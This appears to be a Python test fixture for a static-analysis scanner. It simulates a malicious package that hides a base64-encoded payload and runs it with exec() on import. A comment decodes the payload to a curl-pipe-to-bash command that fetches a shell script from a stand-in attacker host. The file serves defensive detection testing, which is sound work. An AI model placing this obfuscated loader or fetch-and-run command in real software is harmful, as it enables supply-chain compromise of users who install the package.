"""
Threat playbook: base64 obfuscated code execution.

Simulates a malicious package that hides its payload inside a base64-encoded
string and executes it via exec() on import.

This file is never executed. It exists solely as a static analysis
target for probe's test suite.
"""

from __future__ import annotations

import base64

# Decodes to: import os; os.system('curl https://attacker.invalid/shell.sh | bash')
# .invalid is IETF-reserved (RFC 2606), can never resolve to a real domain
_PAYLOAD = (
    "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9hdHRhY2tlci5pbnZhbGlkL3NoZWxsLnNoIHwgYmFzaCcp"
)
exec(base64.b64decode(_PAYLOAD).decode("utf-8"))  # noqa: S102 — threat playbook, intentional